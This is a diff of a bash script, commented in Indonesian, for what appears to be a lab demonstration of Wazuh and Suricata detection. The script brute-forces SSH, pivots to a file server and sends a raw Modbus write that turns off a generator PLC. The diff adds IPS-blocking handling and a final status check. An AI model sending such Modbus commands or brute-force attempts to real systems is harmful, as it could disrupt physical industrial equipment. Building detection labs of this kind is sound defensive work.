@@ -8,7 +8,9 @@
 #   Semua langkah setelah login berjalan di dalam sesi SSH penyerang.
 #
 # Semua trafik nyata: SSH sungguhan (terekam Wazuh) dan Modbus sungguhan
-# (terdeteksi Suricata). Skrip ini hanya pemicunya.
+# (terdeteksi Suricata). Skrip ini hanya pemicunya. Bila Suricata berjalan dalam
+# mode IPS (TAMENG_MODE=ips), perintah Modbus penyerang dijatuhkan dan genset
+# tetap NYALA.
 set -u
 export PATH="$HOME/.docker/bin:$PATH"
 
@@ -35,15 +37,8 @@ for c in pc-staf-07 srv-file-01; do
   done
 done
 
-step "0. Reset: pastikan genset NYALA (coil0=1) — lewat loopback PLC (operasi sah, bukan bagian serangan)"
-# Dikirim dari dalam container PLC ke 127.0.0.1 agar tidak lewat eth0 yang
-# dipantau Suricata; jadi reset ini tidak ikut terdeteksi sebagai serangan.
-docker exec -i plc-genset-01 python3 - <<'PY'
-import socket
-s=socket.create_connection(("127.0.0.1",502),timeout=5)
-s.sendall(bytes.fromhex("00010000000601050000FF00")); s.recv(64); s.close()  # fc5 coil0=ON
-print("genset di-set NYALA")
-PY
+step "0. Operator menyalakan genset lewat HMI resmi (hmi-genset 10.10.5.30) — operasi sah"
+docker exec hmi-genset python3 /app/hmi.py on | sed 's/^/  [HMI] /'
 
 step "1. Brute force SSH ke pc-staf-07 (beberapa percobaan gagal)"
 for u in admin root operator; do
@@ -74,8 +69,21 @@ print("  [srv-file-01] berhasil diakses dari pc-staf-07")
 time.sleep(2)   # jeda realistis antara login dan aksi
 # fc5 addr0 val 0x0000 = OFF
 s=socket.create_connection(("10.10.5.20",502),timeout=5)
-s.sendall(bytes.fromhex("000100000006010500000000")); s.recv(64); s.close()
-print("  perintah Modbus OFF terkirim ke PLC genset dari srv-file-01")
+s.sendall(bytes.fromhex("000100000006010500000000"))
+try:
+    s.recv(64)
+    print("  perintah Modbus OFF terkirim ke PLC genset dari srv-file-01")
+except socket.timeout:
+    print("  perintah Modbus OFF tidak dijawab PLC (diblokir di jalan)")
+s.close()
 PY
+
+step "4. Status genset menurut HMI resmi"
+STATE=$(docker exec hmi-genset python3 /app/hmi.py status)
+if [ "$STATE" = "GENSET NYALA" ]; then
+  echo -e "  \033[1;32m$STATE — serangan ke OT digagalkan\033[0m"
+else
+  echo -e "  \033[1;31m$STATE — dampak serangan ke OT\033[0m"
+fi
 
 echo -e "\n${P}Selesai. Periksa linimasa bukti dengan: scripts/timeline.py${N}"
